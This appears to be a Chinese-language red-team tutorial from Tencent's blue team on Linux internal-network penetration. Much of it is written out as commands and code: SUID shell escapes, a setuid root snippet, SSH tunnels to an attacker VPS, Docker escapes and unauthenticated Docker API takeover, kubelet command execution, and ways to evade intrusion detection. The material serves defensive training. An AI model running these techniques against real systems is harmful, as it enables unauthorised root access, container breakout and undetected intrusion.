> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/egsHOPK_S5vZujqIb3ygOQ)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7W2BM8MA8xvuNkrhCTSosEHjFvicFZGjo63Giad9lQCT3en2wVpHYnQpnA/640?wx_fmt=gif)

**文｜**腾讯蓝军 jumbo

**前言**

上篇[内网渗透](http://mp.weixin.qq.com/s?__biz=MjM5NzE1NjA0MQ==&mid=2651202058&idx=1&sn=d3d57af49cea5f15d2c58b83bac35b7d&chksm=bd2cc7ac8a5b4ebafac72bb78d523f4956804a0d063f9e33f0f49ace2417a6c392738947330a&scene=21#wechat_redirect) (附录 1)主要讲的是 Windows 这块，最近知识星球 “腾讯安平密友圈” 提到了一个问题 **“为什么内网渗透偏向于 Windows”**，笔者也在下面进行了相关回复，除了传统的信息收集、弱口令以外，Linux 内网渗透也有很多可玩性。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WHUlxibGU0iavlYgO3OSzKvdhBngmibfvgFLq6NglfZFzibiauyBLYuSiaRWg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WeQhBGFckAN0Q5lyQ5xO8ibwTXanHZ6jMmWbuaKW34Au9dhicjt6NDo6Q/640?wx_fmt=jpeg)

_关注知识星球，获取独享技术干货_

在服务器方面，Linux 由于开源、稳定、灵活、社区支持等因素，市场占有率远比 Windows 大，并且广大业务逐步上云使用 docker 容器等原因，所以 Linux 渗透攻击也是蓝军极为常见和必备的技能。  

本文将以蓝军攻击视角，介绍常用的 Linux 内网渗透的手法，包括提权、隧道、反弹 shell、登录态、云安全和工具化，主要让大家了解内网渗透的手法和危害，以攻促防，希望能给安全建设带来帮助。

_**提权**_

Linux 不像 Windows 有那么多的提权 EXP，不会动不动就出现各种烂土豆系列，因此 Linux 提权常常成为一个难点。本章将介绍一些 Linux 上的提权手法。  

**2.1 利用内核漏洞进行提权**

脏牛漏洞 (CVE-2016-5195) 是一个影响 2007 年 - 2016 年长达 9 年发行的 Linux 系统的提权漏洞，恶意用户可以利用条件竞争获取 ROOT 权限。

这里以写文件的手段来演示下该漏洞利用方法。

本次漏洞环境如下：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WnibMzTNN0mvz31o9icAkQAcbGYL241PITSfNQrP6BcOE66EibHgRo3oyg/640?wx_fmt=png)

根目录下存在 test.txt：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7W75OdiaCwXn07q1ccEWreqN4kL6QWaV9tVrbBt9oByOVameOAuyIgMlQ/640?wx_fmt=png)

普通用户只能查看而不能修改：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WleZiao80HdAu8HP8HeVCyZSPhJ1OGkVIt1fcibAkzNWgWrSoIVecj5LA/640?wx_fmt=png)

利用 EXP 成功写入文件到只读文件中：  

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7Wzq9X6LLodSgicdBZCLc0BDJVDIcbQD9ZiaBOQq2qnbMr7AgUYJEb5JJQ/640?wx_fmt=png)

附上该漏洞的 POC 集合地址：

https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs

笔者不太喜欢用此类 EXP，包括 Window 上的溢出类漏洞，因为此类漏洞有可能会导致系统崩掉，对于客户环境、敏感系统还是慎用。

针对此类漏洞有些同学会有如下疑问：

**Q：**为什么我执行以后会卡死？

**A：**尝试使用反弹的方式，即交互式 / 半交互式的方法进行。

**2.2 利用文件权限配置不当进行提权**

当某个进程启动权限为 ROOT，对应文件编辑权限为普通用户时，我们可以利用该问题点进行提权。

pspy(附录 2) 工具提供了普通用户权限即可监听进程信息，该工具原理很简单，循环遍历 / proc 下的值来获取进程参数信息：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WQAm1zNfy0WTK13dHGOPjCwrBNCobiawicoQwqjEKRWEAJcIE3wk9hiavA/640?wx_fmt=png)

如果我们设置 hidepid，该工具就会失效，如：

mount -o remount,rw,hidepid=2 /proc  

该工具就什么输出都不会有，或者只有问号：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WicRLCLxqTMcEIg4mDCKK2IJnoHujY3DyuBmDoF7Neqsia7RQPia8nOkGw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7W2mouuotJT92PWIJj4PqI79EibvLWWnvBS2IePicWRIqdyfOaib6nZtoEQ/640?wx_fmt=png)

这里我们使用 pspy 作为辅助演示 (当没设置 hidepid 时)。

前期准备中，首先我们创建一个 while 循环，并使用 ROOT 用户循环执行 / tmp/1.sh。然后当我们获取 USER 普通用户权限时，利用 pspy 可以监控到 ROOT 用户在持续执行 / tmp/1.sh：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7W29icaxB1C7IxiblR32SiaMZ9EwuhbeCVmh7ztN5RWTFQKXbx7En9ZicfLw/640?wx_fmt=png)

尝试查看 / tmp/1.sh 文件内容和权限，发现我们当前用户具备读写权限：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WIdsxxGqYKrichibzPgLG2Han0trXsl2aUfGfcgjvlWhibODmkiaQZMmGYQ/640?wx_fmt=png)

我们尝试替换文件内容，查看是否会以 ROOT 权限启动其中命令：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WVv5kmkJiaXuIOkPPwjcSaOZjEo0ziaS4xqI9UvLkjpVrVbj7Rco4gT4Q/640?wx_fmt=png)

发现成功提权，以 ROOT 权限启动自定义命令：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WF7YVIsqPmwsdOL2NW5HXluQDBqaO147PRpQ1ZibE9ic8YQicCyiccmQt6g/640?wx_fmt=png)

**2.3 利用 SUID 程序进行提权**

当程序运行需要高权限，但是用户不具备高权限时，这时则可以给文件设置 SUID，使得用户在执行文件时将以文件所有者的权限来运行文件，而不是运行者本身权限。

首先 / tmp/test 存在如下文件：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WxHpFo4nt5iaxqFTmR584sS8mSHgew7u4mkpKSTIHAezwYYkWPgvK57g/640?wx_fmt=png)

正常执行结果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WoFF8kgY3OkbCKFdJ0e5bo6Q9FdqZ0LqyzFsX5giaNtz8yOXexbM2WJQ/640?wx_fmt=png)

当设置 SUID 时，执行结果如下：

chmod +s ./test  

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WdR6ticF7eESQCGzoXj0UsE59wDJg8Cq7awHoRuTMes3ic1Iiaib4ibjyPmw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7Whksl5MmdhBQVic3C7X2V10nbvu6IRCnLLUpic27C3vXKavgSPDA0xzibQ/640?wx_fmt=png)

执行结果依然是当前用户，为何？

这是因为在高版本 Linux(附录 3) 中，如果启动 bash 的的 Effective UID 与 Real UID 不相同，而且没有使用 - p 参数，则 bash 会将 Effective UID 还原成 Real UID。即如果就算有 S 位，但没有使用 - p 参数，则最终执行的权限依然是当前用户的权限。

可以使用 setuid(附录 4) 使得 bash 当前 Effective UID 和 Real UID 相同来达到提权效果：

#include<stdlib.h>  

main()

{

setuid(0);

system("whoami> /tmp/test.txt");

}

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WpleicPfjibf8XQsozNvClnVofx7bksLNxI9A4mUibQzkRwVEibzKMntmibg/640?wx_fmt=png)

我们可以使用如下命令来寻找服务器上设置了 SUID 的应用程序：

find / -perm -u=s -type f 2>/dev/null

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WQlPUBKIaCFky8cHEvdysK1ibZXNvUNKRjlkuA2vrTE2Cyr4I2S5YI5A/640?wx_fmt=png)

下面列举几个常见的设置了 SUID 的应用程序提权手段。

**nmap**

nmap --interactive

!sh

**find**

find . -type f -exec /bin/bash \;

**awk**  

awk 'BEGIN {system("/bin/bash")}'  

**strace**

strace -o/dev/null /bin/bash  

_**隧道**_

Linux 上可以利用自带和第三方工具进行隧道开启，利用隧道，我们可以建立 Socks 连接、端口转发等操作。

**3.1 SSH**

Linux 上耳熟能详的就是 SSH 了，我们来看下 SSH 常用的开启隧道的命令。

**场景 a：**在控制 A 机器时，利用 socks 代理进入 A 机器所在内网

ssh -qTfnN -D 1111 root@AIP  

输入 A 机器密码，本地利用 proxychains 等类似工具连接本地的 1111 端口的 sock5 连接即可代理 A 机器的网络。

**场景 b：**如果控制 A、B 机器，A 能够访问 B，且能出网，B 能够访问 C，但不能出网，A 不能访问 C

A 机器执行：  

ssh -CNfg -L 2121:CIP:21 root@BIP  

输入 BIP 机器密码，访问 A 机器的 2121 端口即是访问 CIP 的 21 端口。  

**场景 c：**控制 A 机器，A 能够访问 B

A 机器执行：

ssh -CNfg -R 2121:BIP:21 root@hackervps  

输入黑客 VPS 密码，访问黑客 VPS 的 2121 端口即是访问 BIP 的 21 端口。

**3.2 nc/ncat**

服务端执行监听命令：

ncat --sh-exec "ncat 127.0.0.1 22" -l 80 --keep-open  

客户端连接服务端的 80 端口即可 SSH 连接：

SSH root@serverip -p 80  

**3.3 portmap**

服务端执行：

portmap -m 1 -p1 80 -h2 127.0.0.1 -p2 22  

客户端连接服务端的 80 端口即可 SSH 连接：

SSH root@serverip -p 80  

**3.4 portfw**

服务端执行：

tcpfwd 0.0.0.0:443 127.0.0.1:22  

客户端连接服务端的 443 端口即可 SSH 连接：

SSH root@serverip -p 443

_**反弹 shell**_

Linux 上也存在一些自带命令 / 工具，来进行反弹 shell 得到一个 (非) 交互式 shell。

下述命令中的 yourip 为攻击者监听的 ip；yourport 为攻击者监听的端口。

**4.1 bash**

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7W5RuGgTB5T9uUCl83fPf3jo2f6WZqxgArpJtDnAde21Rtf15jh99krg/640?wx_fmt=png)

**4.2 netcat**

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7W5fM21zlFwMzKXOxqDwsJNAQWibiasNbXl4lsJgYibgU6JAAKiapUDeFslQ/640?wx_fmt=png)

**4.3 php**

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7W8oG7YafzcpVlHfibToCL9xSxuib3oibjnGnDhhicDIPknmJXp8E0tFPDXg/640?wx_fmt=png)

**4.4 perl**

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WiagTTIoezgwM6uEt4Zj3c5tbDNhiajVdwLwgtnDbqJXaKxrhxhCAjqlA/640?wx_fmt=png)

**4.5 python**

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WyT65DjF5bBJNibU68NlY8RRCIj3SFyXpLSXicyibibwibSz1YvfdtJgfIhA/640?wx_fmt=png)

**4.6 ruby**

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WCDxMiabkykHeIxLvVQdibOrNibia4Bant16kglz8WCeibuqLSROiahVpeglQ/640?wx_fmt=png)

**4.7 telnet**

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7Wb9fKuCCvKCbCjGPWVz1e1szw3X6hXPxzxU6FMzicrvFHCdPu5VzXrQg/640?wx_fmt=png)

**4.8 openssl 加密**

服务端生成证书：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WXYXQyBfXnWpdd6YGfAz6BZia42Vvx00r9J4MTeBYU3YX4dThjtnHA8Q/640?wx_fmt=png)

服务端监听：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7Wbf0cG5N7dO3NmjSUMCDEb3Q9SjFQYIZ6Z5UYOVLus4y9rg00BphPCQ/640?wx_fmt=png)

受控端执行：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WLPt9dZnKVo9khbXB4tK31d3ib8d3ia7ibxoIkLERxIW9RS09rbxvYTCTw/640?wx_fmt=png)

**4.9 完全交互式 shell**

attack 端执行：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WhM8xG0utSFsRcMzcePNSZWzbqgTCTYWjZQ1NLcmkNw2LHFJdgPJN9A/640?wx_fmt=png)

victim 端执行：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WFgsGFIuhf7Kfs7jaj1TaCTg7UDfbReUiao8bunoq5ia8cA95oCsUbytA/640?wx_fmt=png)

现在 ctrl+c 也不会退出：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WgEep0rje7IlQgOrGdWRU3862Ql5FSP5TicG3FdC5iaEwpk4IoPavMQ7w/640?wx_fmt=png)

_**登录态**_

现在越来越多的系统接入 SSO、零信任，用户友好度提升了，但是也伴随了大量风险，比如如果单点故障了怎么办。其他安全风险呢？如果我们拿下其中一台可信服务器的权限，是否也伴随着未做隔离的站点也沦为了能快速拿权限的攻击目标？

**5.1 tcpdump**

tcpdump 是一款网络抓包的程序，在 SSO、零信任的场景中，我们可以利用它来获取用户的登录态、Cookie 等敏感信息，然后利用这些信息去登录其他未做隔离的站点。

下面是抓取 http 数据包的命令示例

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WxPbf3A7fB078Aqiapsx5uKRIFDs6ZhqSmrzyljyUnt3W4cDLkmqRicGA/640?wx_fmt=png)

**5.2 网站文件**

除了使用抓包工具去进行敏感信息的抓取，我们还可以在网站本身去做一下手脚。

比如网站是 php 的，那我们可以在配置文件文件中，插入恶意代码，获取 Cookie 等信息，下面是代码示例

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WP5K1CLDYVo9xDPIjDbGtG4WVChWXiahac0fiaSohduu6zjBvONiamZfcQ/640?wx_fmt=png)

_**云安全**_

现在越来越多的业务开始上云，使用容器部署业务，那随之而来的也是对应的安全风险，包括不限于未授权访问、命令执行等漏洞。

**6.1 docker**

**6.1.1 判断是否是 docker 环境**  

*   进程数很少，比如少于 10
    

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WTAs9kajG9Puq7UvJoMsTeSSN19dXsJQbrqgeExUZ2A2vgqMCVS0OPA/640?wx_fmt=png)

*   常见的命令却没有，如没有 wget 命令
    

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7W2cGlzdJv5Bl4ib9ibBgeLq1Crj1WIyicVKTrmQef8jpvhClI4t8WyXLsQ/640?wx_fmt=png)

*   存在 /.dockerenv 文件
    

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WjaboXOCMxoQ5I9xaXic2UHOmltz09f3JbqZtbFpzagQvsVJlKbZuHdg/640?wx_fmt=png)

*   /proc/1/cgroup 内包含 "docker" 字符
    

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WEr1ACdicJlJowJD3PTmib5mMYic1WXicvWHgZ9z1hk5OIUia1k4HeOsoDkA/640?wx_fmt=png)

**6.1.2 逃逸**

逃逸是指我们在容器中逃逸到宿主机中。

**6.1.2.1 特权容器**

当容器是以特权启动时，docker 将允许容器访问宿主机上的所有设备。

如下容器是进行特权启动 (docker run --privileged) 的，我们可以把宿主机磁盘挂载进容器里，然后进行相关的逃逸操作，包括不限于更改计划任务、文件。

fdisk -l|grep /dev/vda1

mkdir /test

mount /dev/vda1 /test

chroot /test

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7W7OoHFraKK2anfQBRcSzibgVibVVXFuvzlqicxfhp6ZL1DN2ujblGJGSaA/640?wx_fmt=png)

**6.1.2.2 Docker Socket**

/var/run/docker.sock 文件是 Docker 守护进程默认监听的 Unix 域套接字，容器中的进程可以通过该文件与 docker 守护进程进行通信。

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WSxLFSWEn7XF46MGNkX7rS7r728YiaAX9xuRDXQvqzmkPxEERnjaXQDQ/640?wx_fmt=png)

当攻击者可控的容器内挂载了该文件，我们也可以对其进行逃逸。

首先我们用如下命令创建一个特权测试容器：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WCdqby5tnM5UhdgNmlhibRwMz7gkSLIn9neXlTywkvYYSbxfm1mHnhOw/640?wx_fmt=png)

比如我们控制了上述容器，并发现其挂载了 docker.sock：  

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WSiaU4XpaevN9rm0vV3QUktAqIMNKyXIfIzXaDeMUwicK5SHwKr5ic6HibA/640?wx_fmt=png)

那么我们可以利用 / var/run/docker.sock 创建特权容器（附录 5）：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WzW49gDpdibCibYn8m5U3bQ2mX78BANAhYjkG3iaKMXic5rQxVlV74VgpBQ/640?wx_fmt=png)

最终发现逃逸成功：  

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WQAB3kY8TUrF3EFic81PWW7QWXSzJMbtsiblRKPbM1GQzPaCZv15562Tg/640?wx_fmt=png)

**6.1.2.3 脏牛**

利用漏洞章节处的脏牛漏洞提权也可以达到逃逸目的，这里不重复演示。

POC 地址：

https://github.com/scumjr/dirtycow-vdso

**6.1.3 未授权访问**

当默认端口为 2375 的 Docker Remote API 对外未授权开放时，攻击者可以利用该漏洞进行 getshell。

a、未授权攻击测试过程：

获取所有 images 列表：

curl http://host:2375/containers/json

获取运行中的容器：

docker -H tcp://host:2375 ps

b、getshell 过程：  

获取镜像:

docker -H tcp://host:2375 images

根据镜像创建容器，把宿主机根目录挂载到容器中：  

docker -H tcp://host:2375 run -it -v /:/mnt/ image_id /bin/bash

创建容器后没自动进入容器的话，可以利用 ps 查看创建容器的 CONTAINER ID：  

docker -H tcp://host:2375 ps

然后进入容器:

docker -H tcp://host:2375 exec -it CONTAINERID sh

默认执行命令只能看到容器内的：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WpZHP1WYxVf3lwYT4fv2MUpS17OMaSoUwyWZItcictaanYibedNkHia0Mw/640?wx_fmt=png)

进入到挂载进来的磁盘中，并切换根目录，则可以看到宿主机进程：

chroot /mnt sh

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WzEWghRbzDSwje8thn1mImibeKuemr6sq4ZpCjTCv8OevpDedtRqYedg/640?wx_fmt=png)

因为挂载把宿主机根目录挂载到了容器中的 / mnt 目录中，就再次回到了上述逃逸的攻击手段了，其他就不再赘述。

**6.2 kubernetes**

kubernetes 简称 k8s，简单理解是拿来自动化部署容器、管理容器的框架。  

**6.2.1 API Server 攻击**

当我们获取到 admin token 时，可以操作 API Server 来控制集群。

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WOntjbdHXfNF2zQicejsgwQfYkR90DfQia4NVJmbfWb3yTTNXz5d5kx3Q/640?wx_fmt=png)

也可以把 admin token 放置在~/.kube/config 文件中，然后利用命令行工具进行后续操作：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WibtTic4XtCvl0oZ0j3Ml9mIWFY9wtdR3xnNticZ653jUu93ib4nFlneLoQ/640?wx_fmt=png)

**6.2.2 kubelet 10250 端口攻击**

10250 端口是 kubelet API 的 HTTPS 端口，该端口提供了 pod 和 node 的信息，如果该端口对外开放，攻击者可以利用公开 api 来获取敏感信息，甚至执行命令。

curl -k https://host:10250/pods

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WltCLKYh8QHoViaGmBFNjrGNQ6mMmpB1NqK3EaL3iagW94TdmECEiciaUTw/640?wx_fmt=png)

根据上述获取到的信息在容器中执行命令：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7W6yt9TvKd2NyYqdyQsR762EKfH2etrBnLhiarKtWmw0ruDmZsibL6xnUA/640?wx_fmt=png)

上述命令得到 websocket 地址，连接 websocket 得到命令结果：  

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7W8RW2OM7AzS7XxRgAia8icjsHNsYbPsiafSzRsy5O7BHNiaQqk5pWPF0HSg/640?wx_fmt=png)

当获取到 admin token 后，也可以利用该服务端口在 pod 中执行命令：  

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WnlbGEURzEhl05FpF2DTiamKNaFaRGk9eZ7Zhq85xmDuvoUlV3wv7piaA/640?wx_fmt=png)

**6.2.3 etcd 2379 端口攻击**

etcd 中存放着 k8s 集群数据，如果可以成功访问该服务端口，则可以获取集群中的敏感信息，包括 k8s secrets、admin token、AKID 等。

_**IDS**_

本章介绍的 IDS 包括 HIDS 和 NIDS。

**7.1 HIDS**

HIDS 涉及到如何绕过服务器上的 agent。

业务服务器上默认都部署了 agent，如何绕过这些 agent 也是一个很大的学问。这些 agent 常常会 hook execve 来获取和判断执行的命令是否恶意。

这里有几个思路和大家一起讨论：

*   滞空 LD_PRELOAD 来绕过用户态的 hook，busybox 同理
    
*   利用代码来执行命令
    
*   利用 ptrace 进行日志混淆
    
*   关闭或致盲 agent 通信
    

**7.2 NIDS**

NIDS 涉及到如何绕过网络设备进行扫描。

在内网渗透中，我们会使用 nmap 去做网络探测，而 nmap 自带的一些特征会导致被安全设备识别和拦截。因此我们需要对 nmap 做一些修改，比如更改 nselib/http.lua，把 nmap 字样删除：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WM7kv3XkCX4YSTxCIJzxa1W2iaIgq1lVRg0icib8PROQibMmibzhRBw6NX2Q/640?wx_fmt=png)

tcpip.cc 更改 windows 窗口大小：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WgQngyCMHS3Pt8aR2XbOo6VGJloYFNRcx8JBYPo3pwXgLvicM9EDPteQ/640?wx_fmt=png)

nselib/rdp.lua 更改 3389 cookie：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7WShtXnniauXFHwaGdN5U8sfNUKEyfRsnUK6pbJ805XfI0JNEyQNukm3A/640?wx_fmt=png)

也可以利用 ipv6 进行绕过 (附录 6)。

也可以利用 curl 进行简单的探测，curl 能获取 banner 信息：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7Wlic9F6TGeZv5cWWT8qzUicjxvLs3OLIjo5qCASJFuaHhyOiawOEVwCxuA/640?wx_fmt=png)

**_工具化_**

当我们拿下跳板机 / 堡垒机此类服务器权限时，上面可用的命令少之又少，甚至连 whoami 都没有！因此我们需要编写一些适用的小工具来帮我们完成一些指定的工作，包括 curl(附录 7)、反弹 shell：

![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP446VYObiaWsjaGxEmiaFYC7Wax3geoRoBtC25Ly2j4NdGRKZtU3EQylcFUbyh1Yu0OrPBOJ3AC5BLg/640?wx_fmt=png)

_**总结**_

内网渗透博大精深，进入内网如何在不被发现的情况下快速获取目标权限也是重中之重，本系列的文章也只是抛砖引玉。腾讯蓝军也会持续和大家分享更多攻防知识，希望能够和大家共同成长，提高整体红蓝对抗水平。

文中涉及的技术信息，只限用于技术交流，切勿用于非法用途。欢迎探讨交流，行文仓促，不足之处，敬请不吝批评指正。

**腾讯蓝军**

腾讯蓝军（Tencent Force）由腾讯 TEG 安全平台部于 2006 年组建，十余年专注前沿安全攻防技术研究、实战演练、渗透测试、安全评估、培训赋能等，采用 APT 攻击者视角在真实网络环境开展实战演习，全方位检验安全防护策略、响应机制的充分性与有效性，最大程度发现业务系统的潜在安全风险，并推动优化提升，助力企业领先于攻击者，防患于未然。

**附录**

**附录 1 [红蓝对抗之 windows 内网渗透](http://mp.weixin.qq.com/s?__biz=MjM5NzE1NjA0MQ==&mid=2651202058&idx=1&sn=d3d57af49cea5f15d2c58b83bac35b7d&chksm=bd2cc7ac8a5b4ebafac72bb78d523f4956804a0d063f9e33f0f49ace2417a6c392738947330a&scene=21#wechat_redirect)**

**附录 2 pspy:**

https://github.com/DominicBreuker/pspy

**附录 3 bash:**

https://Linux.die.net/man/1/bash

**附录 4 setuid:**

https://man7.org/linux/man-pages/man2/setuid.2.html

**附录 5 创建特权容器:**

https://github.com/neargle/cloud_native_security_test_case

**附录 6 利用 ipv6 绕过 ids:**

https://security.tencent.com/index.php/blog/msg/147

**附录 7 curl:**

https://github.com/SYM01/gosnippets/blob/main/curl/curl.go

![](https://mmbiz.qpic.cn/mmbiz_jpg/JMH1pEQ7qP4eziaib54dXlKia5CAp2QHCwIanaf7gDsonkL9KUQdF7Sfh4xrjlPibEBibCoQYQLwyLh5y9cqTOZ3nWA/640?wx_fmt=jpeg "undefined")

我们是 TSRC

互联网安全的守护者

用户数据安全的保卫者

我们找漏洞、查入侵、防攻击

与安全行业精英携手共建互联网生态安全

期待正能量的你与我们结盟！

微信号：tsrc_team

![](https://mmbiz.qpic.cn/mmbiz_jpg/JMH1pEQ7qP4eziaib54dXlKia5CAp2QHCwI1DlZ1xT37D5fyBZHpTCk4AQIfLMgvCiclXHUT9T9iasAvTTaBmujg82g/640?wx_fmt=jpeg "undefined")